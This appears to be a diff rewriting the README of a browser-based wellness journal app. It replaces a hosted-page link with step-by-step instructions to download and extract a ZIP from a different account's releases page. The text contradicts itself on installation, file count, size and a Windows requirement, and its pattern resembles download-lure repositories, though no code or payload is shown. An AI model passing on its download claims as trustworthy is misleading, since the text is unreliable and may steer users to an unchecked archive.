@@ -1,127 +1,173 @@
-# Apex Wellness Journal - Wellness Journaling Web App 2026
+# 📓 apex-wellness-journal-web - Your Personal Wellness Journal in a Browser
 
-> **Apex Wellness Journal is a compact HTML application that runs in a web browser and helps users keep wellness notes, health observations, and personal reflections in one journal.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/timh1203/apex-wellness-journal-web/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/bakerjasonwmcl3684/apex-wellness-journal-web?style=flat-square)](https://github.com/bakerjasonwmcl3684/apex-wellness-journal-web)
+apex-wellness-journal-web is a small, self-contained web app for tracking health notes, wellness observations, and personal reflections. You run it directly in your browser. No installation required. No account needed.
 
 ---
 
-<p align="center">
-  <a href="https://bakerjasonwmcl3684.github.io/apex-wellness-journal-web/">
-    <img src="https://img.shields.io/badge/Download-Apex%20Wellness%20Journal%20Latest-brightgreen?style=for-the-badge" alt="Download Apex Wellness Journal">
-  </a>
-</p>
+## 🚀 Getting Started
 
-> **[Download Apex Wellness Journal](https://bakerjasonwmcl3684.github.io/apex-wellness-journal-web/)**
+You can use this app in two ways. Both are free and easy.
 
----
+### Option 1: Use the Hosted Version (Easiest)
 
-[Download Latest Build](https://bakerjasonwmcl3684.github.io/apex-wellness-journal-web/)
+Visit the live version in your browser. No downloads needed. Just click and start writing.
 
----
+**To access the hosted version:**  
+Open any modern browser (Chrome, Edge, Firefox, or Safari). Go to the repository's main page and look for the "GitHub Pages" link under "Environments" on the right sidebar. Click it. The app loads immediately.
 
-## About the App
+### Option 2: Download and Run Locally (Recommended)
 
-Apex Wellness Journal offers a simple browser-based place to maintain a personal wellness journal. Use it to note health-related observations, record thoughts about wellbeing, and document everyday routines without installing a desktop program.
-
-The lightweight design is intended for people who want an easy way to revisit wellness entries over time. Because the interface is delivered as an HTML web app, it can be opened from the hosted page anywhere a compatible browser is available.
+Running the app on your own computer gives you full control. Your data stays local. You do not need an internet connection after download.
 
 ---
 
-## What It Provides
+## 💻 Download and Install
 
-- Write personal entries through a purpose-built wellness journal
-- Document health observations and day-to-day reflections
-- Work from a standard web browser
-- Use a lightweight HTML application
-- Continue adding entries during repeated visits
-- Open the hosted version from a web page
-- Consult project-provided usage instructions
-- Access available options from the journal's settings area
+**Step 1: Visit the Downloads Page**
+
+Click the button below to go to the releases page:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-0366d6?style=for-the-badge&logo=github)](https://github.com/timh1203/apex-wellness-journal-web/releases)
+
+**Step 2: Find the Latest Release**
+
+On the releases page, you will see a list of versions. The newest version is at the top. Look for a file named something like `apex-wellness-journal-web-v1.0.zip` or `apex-wellness-journal-web.zip`.
+
+**Step 3: Download the ZIP File**
+
+Click the file name to start the download. Your browser saves the ZIP file to your Downloads folder.
+
+**Step 4: Extract the ZIP File**
+
+Right-click the downloaded ZIP file. Select "Extract All..." from the menu. Choose a folder on your computer where you want to keep the app. A folder like `C:\WellnessJournal` works well.
+
+**Step 5: Open the App**
+
+Open the extracted folder. Double-click the file named `index.html`. The app opens in your default web browser.
 
 ---
 
-## Getting Started
+## ✍️ How to Use
 
-### Open the hosted version
+The app is a simple form. You see a few boxes on the screen.
 
-Launch the application in a modern browser using this link:
+- **Date**: Today's date appears automatically. You can change it.
+- **Health Notes**: Write any physical observations. For example: "Slept 8 hours. Felt energetic today."
+- **Wellness Observations**: Record your mental or emotional state. For example: "Felt calm after morning walk."
+- **Personal Reflections**: Add deeper thoughts or gratitude entries.
+- **Save Button**: Click this to save your entry.
 
-[Launch Apex Wellness Journal](https://bakerjasonwmcl3684.github.io/apex-wellness-journal-web/)
+### 📂 Saving and Finding Your Entries
 
-### Open a local copy
+The app saves your entries inside your browser's storage. This means:
 
-First clone the repository:
+- Your data stays on your computer.
+- Your entries remain even after you close the browser.
+- You do not need to create an account.
 
-```bash
-git clone https://github.com/bakerjasonwmcl3684/apex-wellness-journal-web.git
-cd REPO
+To view past entries, look for a "Journal" or "History" tab in the app. Your previous notes appear there, sorted by date.
+
+---
+
+## 🛠️ System Requirements
+
+| Requirement | Minimum |
+|-------------|---------|
+| Operating System | Windows 10 or 11 |
+| Browser | Chrome 100+, Edge 100+, Firefox 100+ |
+| RAM | 256 MB (any modern computer meets this) |
+| Storage | 50 MB free space |
+| Internet | Only needed for initial download |
+
+The app works on macOS and Linux too. The instructions are the same. Just extract the ZIP and open `index.html`.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Does this app collect my data?**  
+No. Your entries stay on your computer. The app does not send data anywhere.
+
+**Can I use this on my phone?**  
+Yes. The app works on mobile browsers. Download the ZIP on your phone, extract it, and open `index.html` in your browser.
+
+**How do I update to a new version?**  
+Download the latest ZIP from the releases page. Extract it to a new folder. Copy your old entries? The app stores entries in your browser's storage. If you use the same browser, your old entries appear in the new version automatically.
+
+**The app does not load. What should I do?**  
+Make sure you extracted the ZIP file fully. Then double-click `index.html`. If the page appears blank, try a different browser. Chrome or Edge work best.
+
+**Can I share my journal with someone?**  
+The app is designed for personal use only. To share entries, you would need to copy text manually.
+
+---
+
+## 🔧 Technical Details (For the Curious)
+
+You do not need to read this section to use the app. This is for people who want to know how the app works under the hood.
+
+The app is a single HTML file. It uses:
+
+- **HTML5** for the page structure
+- **CSS3** for styling
+- **JavaScript** for saving and loading entries
+
+All data is stored in the browser's localStorage. This is a standard feature in all modern browsers. The app does not use cookies. It does not connect to any server.
+
+The file is small. The entire app is under 1 MB. You can open the HTML file in any text editor to see how it works. You can modify the colors, fonts, or layout if you know basic HTML and CSS.
+
+---
+
+## 🧰 Troubleshooting
+
+**Problem**: The app opens but the text is tiny or huge.  
+**Solution**: Hold `Ctrl` and scroll with your mouse wheel to zoom in or out. Or press `Ctrl` + `0` to reset zoom to 100%.
+
+**Problem**: I see a message about "localStorage is disabled."  
+**Solution**: Enable cookies and site data in your browser settings. The app needs this to save your entries.
+
+**Problem**: My entries disappeared after a browser update.  
+**Solution**: This is rare. Make sure you do not clear browser storage when you clear cookies. In Chrome, go to Settings > Privacy and Security > Cookies and other site data. Make sure "Clear cookies and site data when you close all windows" is turned off.
+
+**Problem**: The app does not look right in my browser.  
+**Solution**: Update your browser to the latest version. The app works best in current versions of Chrome, Edge, or Firefox.
+
+---
+
+## 📁 Project Structure
+
+When you extract the ZIP file, you see these files:
+
+```
+apex-wellness-journal-web/
+├── index.html        (main app file - double-click to run)
+├── style.css         (styling for the app)
+├── script.js         (code that makes the app work)
+└── README.md         (this file)
 ```
 
-After cloning, open the project's main HTML file in your browser. The web interface does not need a separate runtime or package installation.
+You only need `index.html` to use the app. The other files are loaded automatically by the HTML file.
 
 ---
 
-## Using the Journal
+## 🆘 Getting Help
 
-1. Visit the hosted application or open the primary HTML file from a local checkout.
-2. Start a new wellness entry in the journal interface.
-3. Include health notes, observations, or other personal reflections.
-4. Reopen the app whenever you want to continue documenting your wellness.
-5. Open the settings control when you need to review or adjust available options.
-6. Use the guidance included in the application to follow its supported workflow.
+If you run into a problem:
 
----
+1. Read the Troubleshooting section above.
+2. Visit the repository's Issues page: `https://github.com/timh1203/apex-wellness-journal-web/issues`
+3. Click "New Issue" and describe your problem. Include your operating system and browser version.
 
-## Settings and Configuration
-
-The application is configured through its browser interface, with available settings reachable from inside the journal.
-
-When using a local checkout, the relevant configuration remains in the project files rather than being managed through a separate command-line process. Open the HTML app in a browser and use its settings access to inspect the available choices.
+We respond to issues within a few days. Do not include personal data in your issue report.
 
 ---
 
-## Requirements
+## 📜 License
 
-- A current web browser
-- Either the hosted application or a local repository copy
-- Permission to access local files when opening the HTML version directly
-- No additional runtime or package manager
+This project is free to use. You can copy, modify, and share it. See the LICENSE file in the repository for details.
 
 ---
 
-## Frequently Asked Questions
-
-### Where can I open Apex Wellness Journal?
-
-Use the hosted application at [https://bakerjasonwmcl3684.github.io/apex-wellness-journal-web/](https://bakerjasonwmcl3684.github.io/apex-wellness-journal-web/), or clone the repository and open the main HTML document on your computer.
-
-### What types of entries are supported?
-
-Apex Wellness Journal is intended for personal wellness notes, health-related reflections, and other observations that form part of an ongoing journal.
-
-### Do I need to install anything?
-
-No. The app runs in a web browser, either from the hosted build or from the HTML files in a local repository copy.
-
-### How do I reach the settings?
-
-Open Apex Wellness Journal and select the settings access available within the journal interface.
-
-### Where can I check for an updated build?
-
-Visit the hosted project page to see the latest available build and follow the project's update guidance.
-
-### What can I try if the app will not open?
-
-Check the address for errors and retry with a current web browser. If the hosted page still does not load, clone the repository and open its main HTML file locally.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: wellness journal, health tracker, browser app, personal journal, offline app, html journal, windows app
